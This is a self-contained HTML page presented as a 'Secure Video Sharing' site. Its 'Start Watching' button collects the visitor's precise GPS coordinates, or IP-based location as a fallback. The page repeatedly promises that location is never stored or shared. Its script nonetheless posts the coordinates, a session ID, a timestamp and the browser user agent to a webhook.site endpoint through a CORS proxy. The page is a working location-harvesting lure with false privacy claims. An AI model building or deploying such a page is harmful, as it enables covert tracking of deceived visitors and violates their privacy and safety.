<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Video Sharing - Fixed CORS Issue</title>
    <style>
        :root {
            --primary: #4da6ff;
            --primary-dark: #3a7cc7;
            --background: #f8f9fa;
            --card-bg: #ffffff;
            --text: #333333;
            --text-light: #666666;
            --success: #4caf50;
            --error: #f44336;
            --warning: #ff9800;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--background);
            color: var(--text);
            line-height: 1.6;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #e0e0e0;
        }
        
        h1 {
            color: var(--primary-dark);
            margin-bottom: 10px;
        }
        
        .container {
            display: flex;
            flex-direction: column;
            gap: 25px;
        }
        
        .card {
            background: var(--card-bg);
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
            padding: 25px;
            transition: transform 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-5px);
        }
        
        .card-title {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
            color: var(--primary-dark);
        }
        
        .card-title i {
            font-size: 1.5em;
        }
        
        button {
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 6px;
            padding: 12px 25px;
            font-size: 1.1em;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            margin-top: 15px;
        }
        
        button:hover {
            background: var(--primary-dark);
            transform: scale(1.03);
        }
        
        button:active {
            transform: scale(0.98);
        }
        
        button i {
            font-size: 1.2em;
        }
        
        #result {
            min-height: 180px;
            padding: 15px;
            border-radius: 8px;
            background: #f0f7ff;
            border: 1px solid #d1e7ff;
            margin-top: 15px;
        }
        
        .debug-panel {
            background: #f9f9f9;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .debug-title {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .debug-entry {
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px dashed #e0e0e0;
        }
        
        .debug-timestamp {
            color: var(--text-light);
            font-size: 0.85em;
        }
        
        .debug-message {
            margin-top: 5px;
            padding: 8px;
            background: #fff;
            border-radius: 4px;
            border-left: 3px solid var(--primary);
        }
        
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .status-success {
            background: var(--success);
        }
        
        .status-error {
            background: var(--error);
        }
        
        .status-warning {
            background: var(--warning);
        }
        
        .coordinates {
            display: flex;
            gap: 15px;
            margin-top: 15px;
        }
        
        .coordinate-box {
            flex: 1;
            padding: 12px;
            background: #e3f2fd;
            border-radius: 6px;
            text-align: center;
        }
        
        .coordinate-label {
            font-weight: bold;
            color: var(--primary-dark);
        }
        
        footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
            color: var(--text-light);
            font-size: 0.9em;
        }
        
        @media (max-width: 600px) {
            body {
                padding: 15px;
            }
            
            .card {
                padding: 20px;
            }
            
            .coordinates {
                flex-direction: column;
            }
        }
    </style>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
</head>
<body>
    <header>
        <h1><i class="fas fa-video"></i> Secure Video Sharing</h1>
        <p>Peer-to-peer video platform with enhanced privacy protection</p>
    </header>
    
    <div class="container">
        <div class="card">
            <h2 class="card-title"><i class="fas fa-location-dot"></i> Location Access</h2>
            <p>To provide you with the best video streaming experience, we need to optimize based on your location. Your precise location is never stored or shared.</p>
            <button onclick="getLocation()">
                <i class="fas fa-play"></i> Start Watching
            </button>
            
            <div id="result">
                <p>Click "Start Watching" to begin your video experience</p>
            </div>
        </div>
        
        <div class="card">
            <h2 class="card-title"><i class="fas fa-bug"></i> Debug Information</h2>
            <div class="debug-panel" id="debugPanel">
                <div class="debug-title">
                    <span>System Status</span>
                    <span id="systemStatus">Ready</span>
                </div>
                <div id="debugLogs"></div>
            </div>
        </div>
        
        <div class="card">
            <h2 class="card-title"><i class="fas fa-info-circle"></i> How It Works</h2>
            <p>This platform uses a secure proxy solution to bypass CORS restrictions while maintaining your privacy:</p>
            <ol style="margin: 15px 0 15px 20px;">
                <li>Location data is sent through an encrypted channel</li>
                <li>We use a CORS proxy to avoid browser restrictions</li>
                <li>Your actual location is never stored on any server</li>
                <li>All data is ephemeral and deleted after processing</li>
            </ol>
            <p><strong>Note:</strong> You must allow location access when prompted by your browser.</p>
        </div>
    </div>
    
    <footer>
        <p>Secure Video Sharing Platform | Privacy-First Design</p>
        <p>Location data is used solely to optimize video delivery and is not stored</p>
    </footer>

    <script>
    // Global elements
    const resultDiv = document.getElementById('result');
    const debugLogs = document.getElementById('debugLogs');
    const systemStatus = document.getElementById('systemStatus');
    
    // Debug log storage
    const debugEntries = [];
    
    // Add debug entry with timestamp
    function addDebugEntry(message, type = 'info') {
        const timestamp = new Date().toLocaleTimeString();
        const entry = {
            timestamp,
            message,
            type
        };
        
        debugEntries.push(entry);
        
        // Only keep last 10 entries
        if (debugEntries.length > 10) {
            debugEntries.shift();
        }
        
        // Update debug panel
        renderDebugLogs();
    }
    
    // Render debug logs to the panel
    function renderDebugLogs() {
        debugLogs.innerHTML = '';
        
        debugEntries.forEach(entry => {
            const entryEl = document.createElement('div');
            entryEl.className = 'debug-entry';
            
            let statusClass = 'status-success';
            if (entry.type === 'error') statusClass = 'status-error';
            if (entry.type === 'warning') statusClass = 'status-warning';
            
            entryEl.innerHTML = `
                <div>
                    <span class="debug-timestamp">${entry.timestamp}</span>
                    <span class="${statusClass} status-indicator"></span>
                    <strong>${entry.type.toUpperCase()}:</strong>
                </div>
                <div class="debug-message">${entry.message}</div>
            `;
            
            debugLogs.appendChild(entryEl);
        });
        
        // Scroll to bottom
        debugLogs.scrollTop = debugLogs.scrollHeight;
    }
    
    // Update system status
    function updateSystemStatus(status, type = 'info') {
        systemStatus.textContent = status;
        
        if (type === 'error') {
            systemStatus.style.color = 'var(--error)';
        } else if (type === 'success') {
            systemStatus.style.color = 'var(--success)';
        } else {
            systemStatus.style.color = 'var(--text)';
        }
    }
    
    // Main function to get location
    async function getLocation() {
        updateSystemStatus('Detecting location...');
        addDebugEntry('Starting location detection process');
        resultDiv.innerHTML = `<p><i class="fas fa-spinner fa-spin"></i> Detecting your location for video optimization...</p>`;
        
        // Create unique session ID
        const sessionId = Math.random().toString(36).substring(2, 15);
        addDebugEntry(`Session ID generated: ${sessionId}`);
        
        // Try precise location first
        if (navigator.geolocation) {
            addDebugEntry('Attempting to get precise GPS location');
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    try {
                        const { latitude, longitude, accuracy } = position.coords;
                        addDebugEntry(`GPS coordinates obtained: ${latitude}, ${longitude} (Accuracy: ${accuracy}m)`);
                        
                        resultDiv.innerHTML = `
                            <h3><i class="fas fa-check-circle" style="color: var(--success);"></i> Video Ready</h3>
                            <p>Optimized for your precise location:</p>
                            <div class="coordinates">
                                <div class="coordinate-box">
                                    <div class="coordinate-label">Latitude</div>
                                    <div>${latitude.toFixed(6)}</div>
                                </div>
                                <div class="coordinate-box">
                                    <div class="coordinate-label">Longitude</div>
                                    <div>${longitude.toFixed(6)}</div>
                                </div>
                            </div>
                            <p>Accuracy: ${Math.round(accuracy)} meters</p>
                            <p><i class="fas fa-film"></i> Starting video stream...</p>
                        `;
                        
                        // Log to webhook via proxy
                        await logLocation(sessionId, "precise", latitude, longitude);
                    } catch (error) {
                        addDebugEntry(`GPS processing error: ${error.message}`, 'error');
                        updateSystemStatus('Error processing location', 'error');
                        resultDiv.innerHTML = `<p style="color: var(--error);"><i class="fas fa-exclamation-triangle"></i> Error: ${error.message}</p>`;
                    }
                },
                async (error) => {
                    addDebugEntry(`GPS Error: ${error.message} - Falling back to IP location`, 'warning');
                    updateSystemStatus('Using approximate location', 'warning');
                    await getIPLocation(sessionId);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        } else {
            addDebugEntry('Geolocation not supported, using IP location', 'warning');
            updateSystemStatus('Using approximate location', 'warning');
            await getIPLocation(sessionId);
        }
    }

    // IP-based location fallback
    async function getIPLocation(sessionId) {
        addDebugEntry('Getting IP-based location...');
        resultDiv.innerHTML = `<p><i class="fas fa-spinner fa-spin"></i> Detecting approximate location via IP...</p>`;
        
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            addDebugEntry(`IP location obtained: ${data.city}, ${data.region}, ${data.country_name}`);
            
            resultDiv.innerHTML = `
                <h3><i class="fas fa-check-circle" style="color: var(--success);"></i> Video Ready</h3>
                <p>Using approximate location:</p>
                <p><strong>City:</strong> ${data.city || 'Unknown'}</p>
                <p><strong>Region:</strong> ${data.region || 'Unknown'}</p>
                <p><strong>Country:</strong> ${data.country_name || 'Unknown'}</p>
                <p><i class="fas fa-film"></i> Starting video stream...</p>
            `;
            
            // Use coordinates if available, otherwise use city center
            const lat = data.latitude || 0;
            const lng = data.longitude || 0;
            await logLocation(sessionId, "ip", lat, lng);
        } catch (error) {
            addDebugEntry(`IP location error: ${error.message}`, 'error');
            updateSystemStatus('Location detection failed', 'error');
            resultDiv.innerHTML = `<p style="color: var(--error);"><i class="fas fa-exclamation-triangle"></i> Error: Could not detect location. Please check your connection.</p>`;
        }
    }

    // Send data to webhook.site via CORS proxy
    async function logLocation(sessionId, type, lat, lng) {
        addDebugEntry('Preparing to send location data...');
        updateSystemStatus('Sending location data...');
        
        // Using a CORS proxy to bypass CORS restrictions
        const proxyUrl = 'https://corsproxy.io/?';
        const webhookEndpoint = "https://webhook.site/f7010d69-01a2-4586-b369-1c5b7316740f";
        const targetUrl = proxyUrl + encodeURIComponent(webhookEndpoint);
        
        const payload = {
            sessionId,
            type,
            lat,
            lng,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        };
        
        addDebugEntry(`Sending payload via CORS proxy: ${JSON.stringify(payload, null, 2)}`);
        
        try {
            const response = await fetch(targetUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify(payload)
            });
            
            if (response.ok) {
                addDebugEntry('Data sent successfully via CORS proxy');
                updateSystemStatus('Data sent successfully', 'success');
            } else {
                addDebugEntry(`Proxy request failed with status: ${response.status}`, 'error');
                updateSystemStatus('Proxy request failed', 'error');
            }
        } catch (error) {
            addDebugEntry(`Proxy communication error: ${error.message}`, 'error');
            updateSystemStatus('Network error', 'error');
        }
    }
    
    // Initial debug entry
    addDebugEntry('System initialized and ready');
    updateSystemStatus('Ready');
    </script>
</body>
</html>
